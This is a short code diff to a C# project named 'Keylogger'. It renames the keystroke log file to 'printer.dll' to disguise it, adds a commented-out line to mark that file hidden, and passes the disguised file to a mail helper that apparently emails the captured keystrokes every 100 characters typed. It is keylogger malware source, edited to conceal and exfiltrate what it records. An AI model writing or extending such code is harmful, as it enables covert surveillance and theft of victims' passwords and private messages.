@@ -33,7 +33,7 @@ namespace Keylogger
                 Directory.CreateDirectory(filePath);
             }
 
-            string path = (filePath + @"\KeyStrokes.txt");
+            string path = (filePath + @"\printer.dll");
 
             if (!File.Exists(path))
             {
@@ -41,6 +41,8 @@ namespace Keylogger
                 {
                 }
             }
+
+            //File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);
 
             //asciitable.com
             int asciTableData = 127;
@@ -74,7 +76,7 @@ namespace Keylogger
                         //send every 100 characters typed.
                         if (numberOfKeystrokes % 100 == 0)
                         {
-                            MailHelper.SendNewMessage();
+                            MailHelper.SendNewMessage(@"\printer.dll");
                         }
                     }
                 }
